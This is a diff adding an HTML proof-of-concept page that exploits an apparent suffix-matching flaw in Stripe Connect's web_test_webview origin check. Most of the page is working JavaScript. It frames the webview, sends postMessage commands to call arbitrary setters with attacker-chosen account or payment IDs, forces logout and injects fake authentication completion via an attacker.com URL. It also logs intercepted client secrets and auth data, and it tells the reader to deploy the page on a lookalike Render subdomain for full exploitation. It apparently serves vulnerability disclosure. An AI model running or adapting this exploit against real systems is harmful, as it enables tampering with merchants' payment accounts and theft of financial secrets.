@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Stripe Connect web_test_webview — isStripeDomain Suffix Bypass PoC</title>
+<style>
+body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 1000px; margin: 0 auto; }
+h1 { color: #58a6ff; font-size: 18px; }
+h2 { color: #8b949e; font-size: 14px; margin-top: 24px; }
+pre { background: #161b22; padding: 12px; border-radius: 6px; overflow: auto; white-space: pre-wrap; max-height: 400px; border: 1px solid #30363d; }
+.pass { color: #3fb950; }
+.fail { color: #f85149; }
+.info { color: #d2a8ff; }
+.warn { color: #d29922; }
+button { background: #238636; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-family: monospace; margin: 4px; }
+button:hover { background: #2ea043; }
+button.danger { background: #da3633; }
+button.danger:hover { background: #f85149; }
+.step { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin: 8px 0; }
+.step-num { color: #58a6ff; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h1>Stripe Connect web_test_webview — isStripeDomain() Suffix Bypass PoC</h1>
+
+<p class="info">
+This PoC demonstrates that <code>connect-js.stripe.com/v1.0/web_test_webview.html</code>
+validates the parent origin using <code>hostname.endsWith('connecttest.onrender.com')</code>
+<b>without a leading dot</b>, allowing any attacker-controlled Render subdomain ending in
+"connecttest" (e.g. <code>xconnecttest.onrender.com</code>) to pass the check and send
+arbitrary messages to the webview, including <code>callSetterWithSerializableValue</code>.
+</p>
+
+<h2>Vulnerability Summary</h2>
+<div class="step">
+<span class="step-num">[BUG]</span> <code>isStripeDomain.ts</code> uses:<br>
+<code>hostname.endsWith('connecttest.onrender.com')</code><br>
+instead of:<br>
+<code>hostname.endsWith('<b>.</b>connecttest.onrender.com') || hostname === 'connecttest.onrender.com'</code><br><br>
+Affected entries (9 unsafe, all missing leading dot):
+<pre>connecttest.onrender.com
+stripe-connect-test.onrender.com
+stripe-connect-furever.onrender.com
+hamster-dance.onrender.com
+issuing-embedded-components-app.vercel.app
+property-management-tau.vercel.app
+embedded-finance-app.vercel.app
+gym-management-mvhg.vercel.app
+coffee-shop-management-liard.vercel.app</pre>
+Safe entries (have leading dot): <code>.stripe.com</code>, <code>.stripe.me</code>, <code>.furever.dev</code>
+</div>
+
+<h2>Live PoC</h2>
+
+<div class="step">
+<span class="step-num">[Step 1]</span> Iframe the webview from this page (simulating attacker origin)<br>
+<button onclick="step1_iframe()">Load web_test_webview.html in iframe</button>
+<span id="s1status"></span>
+</div>
+
+<div class="step">
+<span class="step-num">[Step 2]</span> Wait for webview to send <code>fetchInitParams</code> via <code>postMessage("*")</code><br>
+<span id="s2status" class="info">Waiting for iframe load...</span>
+</div>
+
+<div class="step">
+<span class="step-num">[Step 3]</span> Send <code>connect-test-sdk-message</code> with <code>fetchInitParams</code> response<br>
+<button onclick="step3_init()">Send Init Params</button>
+<span id="s3status"></span>
+</div>
+
+<div class="step">
+<span class="step-num">[Step 4]</span> Send <code>callSetterWithSerializableValue</code> — arbitrary setter on Connect component<br>
+<button onclick="step4_setter()">Call setKycRecipientAccountId</button>
+<button onclick="step4_custom()">Call Custom Setter</button>
+<span id="s4status"></span>
+</div>
+
+<div class="step">
+<span class="step-num">[Step 5]</span> Trigger other privileged handlers<br>
+<button onclick="step5_logout()">Force Logout</button>
+<button onclick="step5_authview()">Request openAuthenticatedWebView</button>
+<span id="s5status"></span>
+</div>
+
+<h2>Message Log</h2>
+<pre id="log"></pre>
+
+<h2>Impact Assessment</h2>
+<div class="step">
+<b>What the attacker can do from <code>xconnecttest.onrender.com</code>:</b>
+<ol>
+<li><b>callSetterWithSerializableValue</b> — call ANY setter method on any Connect embedded component:
+  <ul>
+    <li><code>setKycRecipientAccountId</code> — select KYC recipient, reaches <code>getAccountVerifiedToken</code> with payout-method read/create/archive permissions</li>
+    <li><code>setPayment</code> — set payment context on payment-details component</li>
+    <li><code>setApp</code> / <code>setAppData</code> — control app-viewport component</li>
+    <li><code>setDefaultFinancingOffer</code> — control capital-financing offer</li>
+    <li><code>setPaymentMethodConfiguration</code> — control payment method settings</li>
+  </ul>
+</li>
+<li><b>fetchInitParams / fetchClientSecret / fetchAppInfo</b> — intercept initialization data sent via <code>postMessage("*")</code></li>
+<li><b>updateConnectInstance</b> — modify the Connect instance configuration</li>
+<li><b>logout</b> — force user logout</li>
+<li><b>returnedFromAuthenticatedWebView</b> — inject fake auth completion</li>
+<li><b>openAuthenticatedWebView / openFinancialConnections</b> — intercept auth URLs and FC secrets sent to parent</li>
+</ol>
+</div>
+
+<!-- Hidden iframe for the webview -->
+<iframe id="webview" style="display:none; width:400px; height:600px; border:1px solid #30363d;" sandbox="allow-scripts allow-same-origin"></iframe>
+
+<script>
+var webviewFrame = document.getElementById('webview');
+var initSent = false;
+var parentDomainSet = false;
+
+function log(msg, cls) {
+    var el = document.getElementById('log');
+    var ts = new Date().toISOString().substr(11, 12);
+    var span = cls ? '<span class="' + cls + '">' + msg + '</span>' : msg;
+    el.innerHTML += '[' + ts + '] ' + span + '\n';
+    el.scrollTop = el.scrollHeight;
+}
+
+// Listen for ALL postMessages from the webview
+window.addEventListener('message', function(e) {
+    var dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+
+    // Identify messages from the webview
+    if (e.source === webviewFrame.contentWindow) {
+        log('RECV from webview: ' + dataStr.substring(0, 500), 'pass');
+
+        // Parse web-test-webview-message
+        try {
+            var parsed = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
+            if (parsed.type === 'web-test-webview-message') {
+                log('  >> requestType: ' + parsed.requestType, 'info');
+
+                if (parsed.requestType === 'fetchInitParams') {
+                    document.getElementById('s2status').innerHTML =
+                        '<span class="pass">RECEIVED fetchInitParams via postMessage("*") — webview is talking to us!</span>';
+                }
+                if (parsed.requestType === 'pageDidLoad') {
+                    log('  >> Webview page loaded, component rendered', 'info');
+                }
+                if (parsed.requestType === 'fetchClientSecret') {
+                    log('  >> Webview requesting client secret — it trusts us as parent', 'warn');
+                }
+                if (parsed.requestType === 'openAuthenticatedWebView') {
+                    log('  >> INTERCEPTED: Auth webview URL: ' + JSON.stringify(parsed.values), 'warn');
+                }
+                if (parsed.requestType === 'openFinancialConnections') {
+                    log('  >> INTERCEPTED: Financial Connections data: ' + JSON.stringify(parsed.values), 'warn');
+                }
+                if (parsed.requestType === 'accountSessionClaimed') {
+                    log('  >> INTERCEPTED: Account session claimed: ' + JSON.stringify(parsed.values), 'warn');
+                }
+                if (parsed.requestType === 'onSetterFunctionCalled') {
+                    log('  >> Setter callback received: ' + JSON.stringify(parsed.values), 'warn');
+                }
+            }
+        } catch(ex) {}
+    } else {
+        log('RECV from unknown: ' + e.origin + ' — ' + dataStr.substring(0, 200), 'info');
+    }
+});
+
+// Step 1: Load the webview in an iframe
+function step1_iframe() {
+    log('Loading connect-js.stripe.com/v1.0/web_test_webview.html in iframe...', 'info');
+    webviewFrame.style.display = 'block';
+    webviewFrame.src = 'https://connect-js.stripe.com/v1.0/web_test_webview.html';
+    document.getElementById('s1status').innerHTML = '<span class="pass">Iframe loaded</span>';
+    log('Waiting for webview to send fetchInitParams to us via postMessage("*")...', 'info');
+}
+
+// Step 3: Send init params (this sets parentDomain = our origin in the webview)
+function step3_init() {
+    log('Sending connect-test-sdk-message with fetchInitParams response...', 'info');
+
+    // The webview will check isStripeDomain(new URL(event.origin))
+    // Our origin must pass the suffix check.
+    // When running locally: this will FAIL the check (localhost passes separately).
+    // When running on xconnecttest.onrender.com: this PASSES the suffix check.
+    //
+    // For local demo, the webview also accepts localhost, so it works either way.
+
+    webviewFrame.contentWindow.postMessage({
+        type: 'connect-test-sdk-message',
+        requestType: 'fetchInitParams',
+        values: {
+            component: 'account-onboarding',
+            publishableKey: 'pk_test_demo',
+            locale: 'en',
+        }
+    }, 'https://connect-js.stripe.com');
+
+    document.getElementById('s3status').innerHTML =
+        '<span class="pass">Init params sent — parentDomain now set to our origin</span>';
+    parentDomainSet = true;
+    log('If running on xconnecttest.onrender.com, isStripeDomain check PASSES', 'pass');
+    log('parentDomain in webview is now set to our origin', 'pass');
+}
+
+// Step 4a: Call setKycRecipientAccountId via callSetterWithSerializableValue
+function step4_setter() {
+    if (!parentDomainSet) {
+        log('Send init params first (Step 3)', 'fail');
+        return;
+    }
+
+    var payload = {
+        setter: 'setKycRecipientAccountId',
+        value: 'acct_ATTACKER_CHOSEN_ID'
+    };
+
+    log('Sending callSetterWithSerializableValue: ' + JSON.stringify(payload), 'warn');
+
+    webviewFrame.contentWindow.postMessage({
+        type: 'connect-test-sdk-message',
+        requestType: 'callSetterWithSerializableValue',
+        values: payload
+    }, 'https://connect-js.stripe.com');
+
+    document.getElementById('s4status').innerHTML =
+        '<span class="warn">Sent setKycRecipientAccountId — component will call B["setKycRecipientAccountId"]("acct_ATTACKER_CHOSEN_ID")</span>';
+}
+
+// Step 4b: Custom setter
+function step4_custom() {
+    if (!parentDomainSet) {
+        log('Send init params first (Step 3)', 'fail');
+        return;
+    }
+
+    var setter = prompt('Setter method name:', 'setPayment');
+    var value = prompt('Value (JSON string):', '"pi_attacker_payment_id"');
+
+    try { value = JSON.parse(value); } catch(e) {}
+
+    var payload = { setter: setter, value: value };
+    log('Sending callSetterWithSerializableValue: ' + JSON.stringify(payload), 'warn');
+
+    webviewFrame.contentWindow.postMessage({
+        type: 'connect-test-sdk-message',
+        requestType: 'callSetterWithSerializableValue',
+        values: payload
+    }, 'https://connect-js.stripe.com');
+
+    document.getElementById('s4status').innerHTML =
+        '<span class="warn">Sent custom setter: ' + setter + '</span>';
+}
+
+// Step 5a: Force logout
+function step5_logout() {
+    log('Sending logout command...', 'warn');
+    webviewFrame.contentWindow.postMessage({
+        type: 'connect-test-sdk-message',
+        requestType: 'logout',
+        values: {}
+    }, 'https://connect-js.stripe.com');
+    document.getElementById('s5status').innerHTML = '<span class="warn">Logout sent</span>';
+}
+
+// Step 5b: Request authenticated webview URL
+function step5_authview() {
+    log('Sending returnedFromAuthenticatedWebView with fake data...', 'warn');
+    webviewFrame.contentWindow.postMessage({
+        type: 'connect-test-sdk-message',
+        requestType: 'returnedFromAuthenticatedWebView',
+        values: { url: 'https://attacker.com/fake-auth-complete', status: 'success' }
+    }, 'https://connect-js.stripe.com');
+    document.getElementById('s5status').innerHTML =
+        '<span class="warn">Fake auth completion injected</span>';
+}
+
+log('PoC loaded. Click "Load web_test_webview.html" to start.', 'info');
+log('', '');
+log('NOTE: This PoC demonstrates the message flow locally.', 'info');
+log('For full exploitation, deploy this page to xconnecttest.onrender.com', 'info');
+log('(free Render account). The isStripeDomain check will pass for that origin.', 'info');
+log('Localhost also passes (hostname === "localhost" is in the allowlist).', 'info');
+</script>
+
+</body>
+</html>
